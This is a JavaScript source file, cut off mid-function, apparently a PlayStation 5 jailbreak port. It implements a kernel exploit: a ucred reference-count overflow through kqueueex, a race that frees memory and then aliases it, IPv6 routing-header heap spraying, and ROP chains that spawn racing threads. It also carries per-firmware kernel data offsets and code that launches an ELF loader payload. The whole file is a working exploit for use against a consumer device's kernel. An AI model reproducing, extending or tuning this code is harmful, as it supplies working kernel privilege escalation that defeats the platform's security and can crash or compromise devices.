/*
 * p2jb-y2jb - PS5 jailbreak port to Y2JB (YouTube/JS), tested on FW 11.60,
 *            offsets bundled for FW 9.00 - 12.40.
 * MIT License - see LICENSE.
 *
 * Credits:
 *   - p2jb kernel exploit (cr_ref overflow via kqueueex): Gezine / cheburek3000
 *     (https://github.com/Gezine/Luac0re)
 *   - Y2JB userland framework: Gezine (https://github.com/Gezine/Y2JB)
 *   - elfldr_1320 ELF loader binary: Gezine
 *   - notmaj0r remote_lua_loader p2jb port (secondary reference)
 *
 * Usage: see README.md.
 */

(async function () {
    /* `finally` below needs the state and the abort reason, both of which are scoped
     * inside the try. Hoist references to them rather than widening those scopes. */
    let S_ref = null;
    let fatal_err = null;
    try {
        const p2jb_version = "P2JB 2.6 (Y2JB port)";

        const PAGE_SIZE = 0x4000;

        const AF_UNIX = 1n;
        const AF_INET6 = 28n;
        const SOCK_STREAM = 1n;
        const IPPROTO_IPV6 = 41n;
        const IPV6_RTHDR = 51n;
        const FIONREAD = 0x4004667Fn;   // unread bytes in a pipe -> true consumption
        // fast-iteration debug flag (module scope: used by both prepare_fds and main)
        const _skipleak = /[?&]skipleak=1/.test(location.search);
        // The calibrated burn is a DIAGNOSTIC, and it is OFF by default. It was built on a
        // wrong model (that the crossing was ~500+ closes away). Corrected: f_cred is
        // fixed at falloc time, so files opened before setuid#1 point at a different cred,
        // and the pool's +N cancels the leak's -N, leaving cr_ref(A) = T + 2 - i.e. the
        // crossing is a few TENS of closes. attempt_race already supplies ~290 closes
        // across its 96 attempts, which is exactly how upstream is designed to work
        // (R_ESTIMATE = 83). Worse, the burn SPRAYS after every close, so it reclaims the
        // chunk with a large rthdr header (0x16002c00) and crfree can then never drive it
        // to zero again - which destroys the free-then-alias the race depends on.
        // Enable with ?burn=1 only to re-measure the crossing.
        const _burn = /[?&]burn=1/.test(location.search);
        // RACE-STEP TRACING (?rc=1), OFF BY DEFAULT. The "RC" beacons were added to
        // diagnose a wedge, but syncMark is a SYNCHRONOUS XHR - a blocking network round
        // trip on the main thread. Three of them sit INSIDE flush_iov_workers, between
        // iov_ws.signal() and iov_ws.wait(), i.e. inside the race's critical section, and
        // flush_iov_workers(S,32) runs once per attempt x 96 attempts => ~9,200 blocking
        // round trips injected into the exact window the race depends on. Now that the
        // leak is fixed and the race can actually run, that instrumentation is timing
        // poison. Trace only when explicitly asked for.
        const _rc = /[?&]rc=1/.test(location.search);
        // REPORT THE RUN'S CONFIGURATION IN THE FIRST SECONDS. These flags were previously
        // unobservable until the phase that uses them - the burn beacon does not fire until
        // ~50 minutes in - so a missing ?burn=1 cost an ENTIRE run before anyone noticed.
        // Same class of mistake as a diagnostic that cannot be read until it is too late
        // to act on. Emit it up front, with the actual query string.
        try {
            window.syncMark("FLAGS", "burn=" + _burn + " skipleak=" + _skipleak
                + " rc=" + _rc + " v=132"
                // MUST mirror kexp_launch's own choice or this beacon lies. It did:
                // v103 flipped the default to pthread and this line was left inverted
                // from v99, so the run that finally worked reported spawn=thr_new while
                // actually using pthread. Read the same way the code decides.
                + " spawn=" + (/[?&]spawn=thr_new/i.test(location.search) ? "thr_new" : "pthread")
                + " search=" + (location.search || "(none)"));
        } catch (e) { }
        const rcMark = (a, b) => { if (_rc) window.syncMark(a, b); };

        const SOL_SOCKET = 0xffffn;
        const SO_SNDBUF = 0x1001n;

        const RTP_SET = 1n;
        const PRI_REALTIME = 2n;
        const PRI_TIMESHARE = 1n;   // hand kexp normal scheduling, see KEXP-SCHED

        const F_SETFL = 4n;
        const O_NONBLOCK = 4n;

        const UMTX_OP_WAIT = 2n;
        const UMTX_OP_WAKE = 3n;

        const SYSTEM_AUTHID = 0x4800000000010003n;

        const UCRED_SIZE = 360;
        const RTHDR_TAG = 0x13370000;
        const MSG_IOV_NUM = 23;
        const IOV_THREAD_NUM = 4;
        const UIO_THREAD_NUM = 4;
        const UIO_IOV_COUNT = 20n;
        const UIO_SYSSPACE = 1n;

        // 96 was sized for preburn=230. With the wider runway below the race owns ~60
        // more closes, and a high-C0 boot (350 observed) now needs ~90 attempts to
        // reach the crossing, so 96 would expire just short of it. The pool bounds
        // this: 547 fds - 170 pre-burn = 377 left, and the worst case is 3 closes per
        // attempt, so 120 x 3 = 360 still fits with margin.
        // SIZED FROM THE POOL at the pre-burn below, not here; this is only the
        // floor used by the ?burn=1 diagnostic path, which runs earlier.
        let TRIPLEFREE_ATTEMPTS = 120;
        // How many more attempts the race may run AFTER the crossing has been observed.
        //
        // free_one_fd() closes a pool fd whose f_cred is cred A. Before the crossing that
        // is an ordinary crfree on a live, legitimately-referenced ucred - harmless, and
        // we need a lot of them because C0 varies 265..385 across boots, so 96 attempts
        // must stay available to REACH the crossing. After A is freed, though, the
        // remaining pool fds still hold f_cred = A, so every further close is a crfree on
        // whatever now occupies that chunk.
        //
        // crfree @0xFFFFFFFF80567E40 opens with `lock xadd [rdi],-1` BEFORE the `cmp eax,1`,
        // so that decrement is UNCONDITIONAL - it lands on the occupant no matter what.
        // Measured live on 12.00 (poops CHUNK-PROBE, WORKING.txt 2026-08-15): a freed
        // 512-bucket chunk is re-taken ~27% of the time (78/288 samples) and the occupant
        // carries live kernel pointers at +0x28/+0x30 - the very slots crfree's
        // last-reference path feeds to uifree() and prison_free().
        // v96 crossed at attempt 5/96 and then ran ~250 more of those closes, the most of
        // any run, and panicked the console minutes later.
        // 8 attempts x 2-3 closes caps the exposure at ~24 instead of ~250.
        const POST_CROSSING_BUDGET = 8;
        const MAX_ROUNDS_TWIN = 10;
        const MAX_ROUNDS_TRIPLET = 500;
        const FIND_TRIPLET_FAST = 5000;
        // Spray pressure. 64 sockets is what p2jb used on a host app; we are competing
        // with a browser that allocates constantly, and every reclaim attempt so far has
        // lost. More sockets = more chances that OUR allocation lands in the freed chunk
        // in the same window. fd budget is not a constraint (the probe took 8192 and the
        // process only holds ~79 of its own).
        // 256 = the most sockets whose tag+spray still fits ONE fireSync chain
        // (256 * ~16 slots * 8B = 0x8000 = BATCH_CAP). Staying in a single worker wake is
        // the whole point: the free and the spray then run back-to-back on the SAME core,
        // so the freed chunk is still in that core's per-CPU UMA bucket. Chunking into
        // two batches would reintroduce the park/migrate that loses the race.
        // 192, not 256. MEASURED: a 256-item tagged spray built a 37088-byte chain and
        // rop-worker threw "chain 37088 > cap 32768". Each item is ~18 slots (store = pop
        // rax + pop rdi + mov, then 5 arg pops, pop rax, call), not the 16 I first assumed:
        //   192 * 18 * 8 = 27648 B, comfortably inside BATCH_CAP 0x8000 with wrapper room.
        // Still 3x p2jb's original 64 and still ONE fireSync wake, which is what keeps the
        // free and the spray on the same core.
        const NUM_IPV6_SOCKETS = 192;
        // Core plan derived from the PROCESS's real allowed mask (adapter reads it via
        // cpuset_getaffinity). Y2JB could hardcode 0-3 + main 4 because its syscalls ran
        // on the JS main thread; here they run on the poops WORKER, so "MAIN_CORE" is the
        // EXECUTOR's core and the JS main thread is never pinned. If the leak saturates
        // every allowed core, the unpinned main thread starves -> WebKit hang watchdog
        // ("page stopped loading"). So: reserve the top allowed core for the executor and
        // leave one entirely free for the JS main thread; leak gets the rest.
        let MAIN_CORE = 4;
        const MAIN_RTPRIO = 256;
        let LEAK_CORES = [0, 1, 2, 3];
        (function planCores() {
            const a = window.P2JB_ALLOWED_CORES;
            if (!Array.isArray(a) || a.length < 3) return;   // too few to reserve; keep defaults
            MAIN_CORE = a[a.length - 1];                     // executor (worker) core
            /* LOCAL pooP2JB ONLY -- 4 leak cores instead of 3.
               Upstream reserves a[len-2] for the JS main thread and leaks on
               a.slice(0, len-2). On this console P2JB_ALLOWED_CORES is [9,11,13,14,15],
               giving leak=[9,11,13] exec=15 and leaving core 14 idle. Stage 0 measured
               ~320 kqueueex/sec on 3 cores and took ~54 min; a 4th core should cut that
               to ~40 min IF the leak is core-bound rather than pipe-bound.
               THE TRADE-OFF IS REAL: core 14 is deliberately free so the JS main thread
               -- which drives the feed loop, reads FIONREAD and emits every beacon --
               always has somewhere to run. Taking it means main competes with a leak
               thread; if main starves, the feed loop stalls and that looks like a
               slowdown or a silent hang, not a crash.
               So this is a URL knob, not a hard edit: ?leakcores=3 restores upstream
               behaviour without touching this file. Default here is 4 as requested. */
            // 2026-08-25: default restored to UPSTREAM (a.length - 2), which reserves a
            // core for the JS main thread. The local default of 4 left main with no
            // reserved core on the 5-core mask [9,11,13,14,15] (leak=[9,11,13,14] exec=15).
            // signal() polls awake[] FROM THE MAIN THREAD against a 5s wall-clock deadline,
            // so once main is descheduled past 5s it wakes and declares
            //   "worker_sync.signal: WAKE timeout - worker 0/4 never reached WAIT exit"
            // even though the workers did wake - a false positive, exactly the failure seen
            // on a 12.40 console. The comment above already predicted this ("if main starves
            // ... looks like a slowdown or a silent hang"). ?leakcores=4 restores the faster
            // plan on sites whose query gate allows extra parameters.
            let _lc = Math.max(1, a.length - 2);
            const _lcm = /[?&]leakcores=(\d+)/i.exec(String(location.search || ""));
            if (_lcm) _lc = parseInt(_lcm[1], 10) || _lc;
            const _maxLeak = a.length - 1;          // everything except the executor core
            if (_lc > _maxLeak) _lc = _maxLeak;
            if (_lc < 1) _lc = 1;
            LEAK_CORES = a.slice(0, _lc);
            try {
                window.syncMark("CORE-PLAN", "allowed=[" + a.join(",") + "]"
                    + " leak=[" + LEAK_CORES.join(",") + "] exec=" + MAIN_CORE
                    + " requested=" + _lc + " upstream_default=" + (a.length - 2)
                    + (_lc > a.length - 2
                        ? " -- JS main has NO reserved core now; ?leakcores=3 reverts"
                        : ""));
            } catch (e) { }
        })();

        const SYSCALL_EXTRA = {
            recvmsg: 0x1bn,
            socketpair: 0x87n,
            kqueue: 0x16an,
            kqueueex: 0x8Dn,
            readv: 0x78n,
            writev: 0x79n,
            setrlimit: 0xC3n,
            connect: 0x62n,   // needed to ask the console if elfldr is listening
        };
        for (const k in SYSCALL_EXTRA) {
            if (!(k in SYSCALL)) SYSCALL[k] = SYSCALL_EXTRA[k];
        }

        const FW_OFFSETS_P2JB = {
            "9.00": {
                DATA_BASE_ALLPROC: 0x02755D50n,
                DATA_BASE_SECURITY_FLAGS: 0x00D72064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02D28B78n,
                DATA_BASE_GVMSPACE: 0x02D8A570n
            },
            "9.05": {
                DATA_BASE_ALLPROC: 0x02755D50n,
                DATA_BASE_SECURITY_FLAGS: 0x00D73064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02D28B78n,
                DATA_BASE_GVMSPACE: 0x02D8A570n
            },
            "10.00": {
                DATA_BASE_ALLPROC: 0x02765D70n,
                DATA_BASE_SECURITY_FLAGS: 0x00D79064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02CF0EF8n,
                DATA_BASE_GVMSPACE: 0x02D52570n
            },
            "11.00": {
                DATA_BASE_ALLPROC: 0x02875D70n,
                DATA_BASE_SECURITY_FLAGS: 0x00D8C064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02E04F18n,
                DATA_BASE_GVMSPACE: 0x02E66570n
            },
            // 12.00-12.70: VERIFIED IDENTICAL by offline cross-version RE
            // (E:\ps5\p2jb\kfind.py). All six 12.x kernels are distinct builds (different
            // SHA1, same size) and the .text DID shift — e.g. an allproc reference moves
            // 0x5e3aeb -> 0x5e396b (-0x180, matching the entry-point delta) while its
            // rip-relative displacement grows 0x03002311 -> 0x03002491 (+0x180), landing
            // on the SAME VA 0xffffffff837e5e00. Offsets are relative to
            // kdata_base = 0xffffffff80f60000 (the rodata PT_LOAD). Each value was voted
            // by 10-76 independent, uniquely-matching reference sites, unanimously.
            // => the kernel DATA layout is frozen across 12.x; only code moved.
            "12.00": {
                DATA_BASE_ALLPROC: 0x02885E00n,
                DATA_BASE_SECURITY_FLAGS: 0x00D83064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02E1CFB8n,
                DATA_BASE_GVMSPACE: 0x02E7E570n
            },
            "12.02": {
                DATA_BASE_ALLPROC: 0x02885E00n,
                DATA_BASE_SECURITY_FLAGS: 0x00D83064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02E1CFB8n,
                DATA_BASE_GVMSPACE: 0x02E7E570n
            },
            "12.20": {
                DATA_BASE_ALLPROC: 0x02885E00n,
                DATA_BASE_SECURITY_FLAGS: 0x00D83064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02E1CFB8n,
                DATA_BASE_GVMSPACE: 0x02E7E570n
            },
            "12.40": {
                DATA_BASE_ALLPROC: 0x02885E00n,
                DATA_BASE_SECURITY_FLAGS: 0x00D83064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02E1CFB8n,
                DATA_BASE_GVMSPACE: 0x02E7E570n
            },
            "12.60": {
                DATA_BASE_ALLPROC: 0x02885E00n,
                DATA_BASE_SECURITY_FLAGS: 0x00D83064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02E1CFB8n,
                DATA_BASE_GVMSPACE: 0x02E7E570n
            },
            "12.70": {
                DATA_BASE_ALLPROC: 0x02885E00n,
                DATA_BASE_SECURITY_FLAGS: 0x00D83064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02E1CFB8n,
                DATA_BASE_GVMSPACE: 0x02E7E570n
            },
        };
        const FW_ALIAS_P2JB = {
            "9.00": "9.00",
            "9.20": "9.05", "9.40": "9.05", "9.60": "9.05",
            "10.00": "10.00", "10.01": "10.00", "10.20": "10.00", "10.40": "10.00", "10.60": "10.00",
            "11.00": "11.00", "11.20": "11.00", "11.40": "11.00", "11.60": "11.00",
            // NO 12.x ALIASES, DELIBERATELY. Every 12.x firmware has its own
            // entry in FW_OFFSETS_P2JB above, so aliasing them to "12.00" only
            // hid those entries: the alias was applied BEFORE the lookup, so
            // FW_OFFSETS_P2JB["12.40"] was dead code that could be edited with
            // no effect whatsoever. Worse, it made the throw below unreachable
            // for 12.02/12.20/12.40/12.60/12.70 -- the exact firmwares its own
            // comment says it exists to protect, because an aliased key always
            // resolves.
            //
            // Removing them changes NOTHING today: all six 12.x entries were
            // verified byte-for-byte against the decrypted kernels in
            // I:\americana (retail) and I:\extracted (devkit) on 2026-08-31,
            // identical VAs and identical reference counts in every build. It
            // only means a FUTURE 12.x with different offsets is refused loudly
            // instead of silently running 12.00's numbers and panicking.
        };

        function ensure_kernel_offset() {

            let key = FW_VERSION;
            if (FW_ALIAS_P2JB[key]) key = FW_ALIAS_P2JB[key];
            let fw = FW_OFFSETS_P2JB[key];
            if (!fw) {
                // DO NOT fall back to major+".00" for KERNEL DATA offsets. Userland
                // offsets are safe to inherit across minors, but allproc/security_flags/
                // pmap_store/gvmspace MOVE between minor kernels — using 12.00 values on
                // 12.70 writes to the wrong kernel addresses and panics the console.
                // Refuse instead, and say exactly what has to be RE'd.
                throw new Error("p2jb: FW " + FW_VERSION + " has no kernel offsets. "
                    + "RE these 4 from the " + FW_VERSION + " kernel and add FW_OFFSETS_P2JB[\""
                    + FW_VERSION + "\"]: DATA_BASE_ALLPROC, DATA_BASE_SECURITY_FLAGS, "
                    + "DATA_BASE_KERNEL_PMAP_STORE, DATA_BASE_GVMSPACE. "
                    + "(Refusing the major.00 fallback - wrong kernel offsets = panic.)");
            }

            kernel_offset = {
                DATA_BASE_ALLPROC: fw.DATA_BASE_ALLPROC,

                PROC_PID: 0xBCn, PROC_UCRED: 0x40n, PROC_FD: 0x48n,
                PROC_VM_SPACE: 0x200n,

                UCRED_CR_UID: 0x04n, UCRED_CR_RUID: 0x08n, UCRED_CR_SVUID: 0x0Cn,
                UCRED_CR_NGROUPS: 0x10n, UCRED_CR_RGID: 0x14n,
                UCRED_CR_SVGID: 0x18n,
                UCRED_CR_SCEAUTHID: 0x58n, UCRED_CR_SCECAPS0: 0x60n,
                UCRED_CR_SCECAPS1: 0x68n,

                FILEDESC_OFILES: 0x00n, FDESCENTTBL_HDR: 0x08n,
                FILEDESCENT_SIZE: 0x30n,
                SIZEOF_OFILES: 0x30n,

                FD_CDIR: 0x08n, FD_RDIR: 0x10n, FD_JDIR: 0x18n, KQ_FDP: 0xA8n,

                SO_PCB: 0x18n,

                INPCB_PKTOPTS: 0x120n, IP6PO_RTHDR: 0x70n,

                PIPE_SIGIO: 0xD8n,

                PMAP_PML4: 0x20n, PMAP_CR3: 0x28n,

                SIZEOF_GVMSPACE: 0x100n,
                GVMSPACE_START_VA: 0x08n,
                GVMSPACE_SIZE: 0x10n,
                GVMSPACE_PAGE_DIR_VA: 0x38n,

                DATA_BASE_SECURITY_FLAGS: fw.DATA_BASE_SECURITY_FLAGS || null,
                DATA_BASE_KERNEL_PMAP_STORE: fw.DATA_BASE_KERNEL_PMAP_STORE || null,
                DATA_BASE_GVMSPACE: fw.DATA_BASE_GVMSPACE || null,
                DATA_BASE_TARGET_ID: fw.DATA_BASE_SECURITY_FLAGS ? fw.DATA_BASE_SECURITY_FLAGS + 0x09n : null,
                DATA_BASE_QA_FLAGS: fw.DATA_BASE_SECURITY_FLAGS ? fw.DATA_BASE_SECURITY_FLAGS + 0x24n : null,
                DATA_BASE_UTOKEN_FLAGS: fw.DATA_BASE_SECURITY_FLAGS ? fw.DATA_BASE_SECURITY_FLAGS + 0x8Cn : null,
            };
        }

        let saved_fpu_ctrl = 0;
        let saved_mxcsr = 0;

        let failcheck_path = null;

        function my_init_threading() {
            const setjmp_addr = window.P2JB_SETJMP || (libc_base + 0x58F80n);
            const jmpbuf = malloc(0x60);
            call(setjmp_addr, jmpbuf);
            saved_fpu_ctrl = Number(read32(jmpbuf + 0x40n));
            saved_mxcsr = Number(read32(jmpbuf + 0x44n));
        }

        function js_sleep(ms) {
            return new Promise((resolve) => { setTimeout(resolve, ms); });
        }

        // NATIVE thread spawn for the elfldr payload: same RAW thr_new(0x1C7) path that has
        // spawned every leak worker on every run, but entering real code at `entry(arg)`
        // instead of longjmp'ing into a ROP chain.
        // WHY NOT scePthreadCreate: elf_run originally launched the payload with it, and
        // that wrapper does TLS + thread-library bookkeeping that FAULTS from the hijacked
        // worker ROP context (SIGILL, no return - FAILS #15). That call site had NEVER
        // executed before, because no run ever reached elfldr; it would have SIGILL'd
        // AFTER a successful 50-minute jailbreak. The kernel starts the thread at
        // entry(arg) directly, which is exactly what the payload wants.
        function spawn_native_thread(entry, arg) {
            const THR_STACK = 0x80000, THR_TLS = 0x40;   // payload gets a real 512K stack
            const thr_stack = malloc(THR_STACK);
            const thr_tls = malloc(THR_TLS);
            write64(thr_tls, thr_tls);                   // TLS self-pointer at +0
            const tidbuf = malloc(8); write64(tidbuf, 0n);
            const ptidbuf = malloc(8); write64(ptidbuf, 0n);
            const exitStub = window.P2JB_THR_EXIT_STUB || 0n;
            // The payload's entry DOES return - IDA on elfldr-ps5-1360.elf e_entry=0x46b8:
            //   mov [rip+0x58341],rsp / and rsp,~0xF / call 0x4710 / mov rsp,[..] / RET
            // so this return address WILL execute. Where it is read from, RE'd out of the
            // 12.00 kernel (cpu_set_upcall @0xffffffff80cefb20):
            //   rax = ss_sp + ss_size ; and rax,~0xF ; tf_rsp = rax ; tf_rsp += -8
            // => initial rsp = ((base+size) & ~0xF) - 8 = base+0x7FFF8 (16-aligned) or
            //    base+0x7FFF0 (8-aligned) - both inside the 16 slots filled below.
            // A ZERO stub means the payload returns to address 0 and kills the WHOLE
            // process - every thread, including elfldr's listener - AFTER a ~55 min
            // jailbreak. Beacon it so a zero is visible up front, not as a silent death.
            window.syncMark("ELF-EXITSTUB", "thr_exit stub=" + toHex(exitStub)
                + (exitStub === 0n
                    ? "  *** ZERO - payload return would SIGSEGV the process;"
                      + " p.syscalls[0x1AF] unavailable ***"
                    : "  (ok - poops calls syscalls[431] on its own live path)"));
            for (let q = 1; q <= 16; q++)
                write64(thr_stack + BigInt(THR_STACK - q * 8), exitStub);
            const param = malloc(0x68);
            for (let q = 0; q < 0x68; q += 8) write64(param + BigInt(q), 0n);
            write64(param + 0x00n, entry);               // start_func = ELF entry
            write64(param + 0x08n, arg);                 // arg -> rdi = payload_args
            write64(param + 0x10n, thr_stack);
            write64(param + 0x18n, BigInt(THR_STACK));
            write64(param + 0x20n, thr_tls);
            write64(param + 0x28n, BigInt(THR_TLS));
            write64(param + 0x30n, tidbuf);
            write64(param + 0x38n, ptidbuf);
            window.syncMark("ELF-SPAWN", "thr_new entry=" + toHex(entry) + " arg=" + toHex(arg)
                + " stack=" + toHex(thr_stack) + "/" + toHex(BigInt(THR_STACK)));
            const ret = syscall(SYSCALL.thr_new, param, 0x68n);
            window.syncMark("ELF-SPAWN-RET", "ret=" + toHex(ret)
                + " tid=" + toHex(read64(tidbuf))
                + (toBigSafe(ret) === 0n ? "  (0 = thread created)" : "  *** thr_new FAILED ***"));
            return { ret: toBigSafe(ret), tid: read64(tidbuf) };
        }

        function spawn_leak_worker(chain_addr) {
            const pthread_create_addr = window.P2JB_PTHREAD_CREATE || (libc_base + 0x4BF0n);
            const longjmp_addr = window.P2JB_LONGJMP || (libc_base + 0x58FD0n);
            const scratch = malloc(0x100);
            for (let i = 0; i < 0x100; i += 8) write64(scratch + BigInt(i), 0n);
            const jb = malloc(0x60);
            for (let i = 0; i < 0x60; i += 8) write64(jb + BigInt(i), scratch);
            write64(jb + 0x00n, ROP.ret);
            write64(jb + 0x10n, chain_addr);
            write32(jb + 0x40n, BigInt(saved_fpu_ctrl));
            write32(jb + 0x44n, BigInt(saved_mxcsr));
            const _n = (window.__spn = (window.__spn || 0) + 1);
            // RAW thr_new(0x1C7) — NOT the libc scePthreadCreate/Thrd_create wrapper.
            // The wrapper does TLS + thread-library bookkeeping that FAULTS when invoked
            // from the hijacked-worker ROP context (SIGILL, no return; see FAILS #15).
            // poops spawns all its racers the same way (poops.js:8820). The kernel just
            // starts the thread at entry(arg), so longjmp(jb) pivots straight to the chain.
            const THR_STACK = 0x8000, THR_TLS = 0x40;
            const thr_stack = malloc(THR_STACK);
            const thr_tls = malloc(THR_TLS);
            write64(thr_tls, thr_tls);                 // TLS self-pointer at +0
            const tidbuf = malloc(8); write64(tidbuf, 0n);
            const ptidbuf = malloc(8); write64(ptidbuf, 0n);
            // stack top = thr_exit stub, so a returning chain exits instead of ret'ing to junk
            const exitStub = window.P2JB_THR_EXIT_STUB || 0n;
            for (let q = 1; q <= 16; q++)
                write64(thr_stack + BigInt(THR_STACK - q * 8), exitStub);
            const param = malloc(0x68);
            for (let q = 0; q < 0x68; q += 8) write64(param + BigInt(q), 0n);
            write64(param + 0x00n, longjmp_addr);      // entry: longjmp(jb) -> pivots to chain
            write64(param + 0x08n, jb);                // arg -> rdi
            write64(param + 0x10n, thr_stack);
            write64(param + 0x18n, BigInt(THR_STACK));
            write64(param + 0x20n, thr_tls);
            write64(param + 0x28n, BigInt(THR_TLS));
            write64(param + 0x30n, tidbuf);            // child tid out
            write64(param + 0x38n, ptidbuf);           // parent tid out
            window.syncMark("SP-CALL#" + _n, "thr_new entry=" + toHex(chain_addr) + " lj=" + toHex(longjmp_addr)
                + " param=" + toHex(param) + " stack=" + toHex(thr_stack) + " exitStub=" + toHex(exitStub)
                + " fpu=" + saved_fpu_ctrl);
            const ret = syscall(SYSCALL.thr_new, param, 0x68n);
            window.syncMark("SP-RET#" + _n, "ret=" + toHex(ret));   // sync: survives a worker crash
            if ((ret & 0xFFFFFFFFn) !== 0n) fail("leak worker thr_new failed: " + toHex(ret));
            const _h = read64(tidbuf);
            window.syncMark("SP-HANDLE#" + _n, "tid=" + toHex(_h));
            window.liveStatus("SETUP - thread " + _n + " spawned  tid=" + toHex(_h));
            return _h;
        }

        // build_elf_entry_chain() was DELETED here. It built a ROP chain that called the
        // elfldr ELF's own entry with payload_args in rdi (the v91 spawn). That entry point
        // is not how elfldr is started on 12.00 - see the KEXP HANDOFF block below - so the
        // chain, and the three spawn variants built around it, are gone with it.

        function build_leak_worker_chain(core, pipe_rfd, finished_addr, dummybuf, unroll, remainder) {
            const POC_ARG = 0x800000000000n;
            const EXIT_MARK = 0xDEADn;
            const STACK_SIZE = 0x4000 + (unroll * 31 + remainder * 6 + 0x200) * 8;
            const buf = malloc(STACK_SIZE);
            for (let k = 0n; k < 0x4000n; k += 8n) write64(buf + k, 0n);
            const entry = buf + 0x4000n;

            const mask = malloc(0x10);
            write64(mask + 0x0n, 1n << BigInt(core));
            write64(mask + 0x8n, 0n);

            let idx = 0;
            const emit = (v) => { write64(entry + BigInt(idx * 8), v); idx++; };
            const at = (i) => entry + BigInt(i * 8);

            emit(ROP.ret);
            emit(ROP.ret);

            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
            emit(ROP.pop_rdi); emit(3n);
            emit(ROP.pop_rsi); emit(1n);
            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
            emit(ROP.pop_rcx); emit(0x10n);
            emit(ROP.pop_r8); emit(mask);
            emit(syscall_wrapper);
            emit(ROP.ret);
            const LOOP_START = idx;

            const readBase = idx;
            emit(ROP.pop_rax); emit(SYSCALL.read);
            emit(ROP.pop_rdi); emit(BigInt(pipe_rfd));
            emit(ROP.pop_rsi); emit(dummybuf);
            emit(ROP.pop_rdx); emit(1n);
            emit(syscall_wrapper);
            emit(ROP.ret);

            const kqBase = [];
            for (let k = 0; k < unroll; k++) {
                kqBase.push(idx);
                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
                emit(ROP.pop_rdi); emit(POC_ARG);
                emit(syscall_wrapper);
                emit(ROP.ret);
            }

            const repairSlot = (slotIdx, value) => {
                emit(ROP.pop_rdi); emit(at(slotIdx));
                emit(ROP.pop_rax); emit(value);
                emit(ROP.mov_qword_rdi_rax);
            };
            repairSlot(readBase + 0, ROP.pop_rax);
            repairSlot(readBase + 1, SYSCALL.read);
            repairSlot(readBase + 2, ROP.pop_rdi);
            repairSlot(readBase + 3, BigInt(pipe_rfd));
            repairSlot(readBase + 4, ROP.pop_rsi);
            repairSlot(readBase + 5, dummybuf);
            repairSlot(readBase + 6, ROP.pop_rdx);
            repairSlot(readBase + 7, 1n);
            repairSlot(readBase + 8, syscall_wrapper);
            for (let k = 0; k < unroll; k++) {
                const b = kqBase[k];
                repairSlot(b + 0, ROP.pop_rax);
                repairSlot(b + 1, SYSCALL.kqueueex);
                repairSlot(b + 2, ROP.pop_rdi);
                repairSlot(b + 3, POC_ARG);
                repairSlot(b + 4, syscall_wrapper);
            }

            emit(ROP.pop_rax); emit(1n);
            emit(ROP.pop_rdi); emit(finished_addr);
            emit(ROP.mov_qword_rdi_rax);

            emit(ROP.pop_rsp);
            const PIVOT = idx; emit(at(LOOP_START));

            if (idx % 2 !== 0) emit(ROP.ret);
            const EXIT = idx;
            for (let k = 0; k < remainder; k++) {
                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
                emit(ROP.pop_rdi); emit(POC_ARG);
                emit(syscall_wrapper);
                emit(ROP.ret);
            }
            emit(ROP.pop_rax); emit(EXIT_MARK);
            emit(ROP.pop_rdi); emit(finished_addr);
            emit(ROP.mov_qword_rdi_rax);
            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
            emit(ROP.pop_rdi); emit(0n);
            emit(syscall_wrapper);

            return { entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT) };
        }

        function ulog(msg) {
            return log("[p2jb] " + msg);
        }
        function fail(msg) { throw new Error("p2jb: " + msg); }

        function nanosleep_ms(ms) {
            const ts = malloc(16);
            write64(ts, BigInt(Math.floor(ms / 1000)));
            write64(ts + 8n, BigInt((ms % 1000) * 1000000));
            syscall(SYSCALL.nanosleep, ts, 0n);
        }
        function sched_yield_n(n) {
            for (let i = 0; i < n; i++) syscall(SYSCALL.sched_yield);
        }

        function build_rthdr(buf, size) {
            const len = ((Number(size) >> 3) - 1) & ~1;
            const actual_size = (len + 1) << 3;
            write8(buf, 0n);
            write8(buf + 1n, BigInt(len));
            write8(buf + 2n, 0n);
            write8(buf + 3n, BigInt(len >> 1));
            return actual_size;
        }
        function set_rthdr(sd, buf, len) {
            return syscall(SYSCALL.setsockopt, BigInt(sd), IPPROTO_IPV6, IPV6_RTHDR,
                buf, BigInt(len));
        }
        function free_rthdr(sd) {
            return syscall(SYSCALL.setsockopt, BigInt(sd), IPPROTO_IPV6, IPV6_RTHDR, 0n, 0n);
        }

        function make_worker_sync(n, label) {
            const HDR_SIZE = 8;
            const ARRAY_SIZE = 3 * n * 8;
            const raw = malloc(64 + HDR_SIZE + ARRAY_SIZE + 128);
            const align = (64n - (raw % 64n)) % 64n;
            const cmd_addr = raw + align;
            const finished_base = cmd_addr + 8n;
            const awake_base = finished_base + BigInt(n * 8);

            write64(cmd_addr, 0n);
            for (let i = 0; i < n; i++) {
                write64(finished_base + BigInt(i * 8), 0n);
                write64(awake_base + BigInt(i * 8), 0n);
            }

            const ws = {
                n,
                label: label || "?",
                cmd: cmd_addr,
                gen: 0n,
                finished: finished_base,
                awake: awake_base,

                wait_val_slots: new Array(n).fill(0n),
                pivot_slots: new Array(n).fill(0n),
                exit_addrs: new Array(n).fill(0n),
                signal() {
                    const next = this.gen + 1n;
                    this.gen = next;

                    for (let i = 0; i < n; i++) {
                        write64(this.finished + BigInt(i * 8), 0n);
                        write64(this.awake + BigInt(i * 8), 0n);
                    }

                    for (let i = 0; i < n; i++) {
                        write64(this.wait_val_slots[i], next);
                    }

                    write64(this.cmd, next);

                    // DIAGNOSTIC ONLY - this block runs exclusively on the timeout
                    // path, where the run is already dead. Nothing here executes on a
                    // healthy signal(), so it cannot perturb the race.
                    // Every worker chain pins ITSELF to cpu_mask (= 1 << MAIN_CORE, one
                    // core) and raises ITSELF to PRI_REALTIME/MAIN_RTPRIO before waiting.
                    // So 12 racers + the RT main thread share ONE core at equal realtime
                    // priority. Report the whole awake vector, not just the first hole:
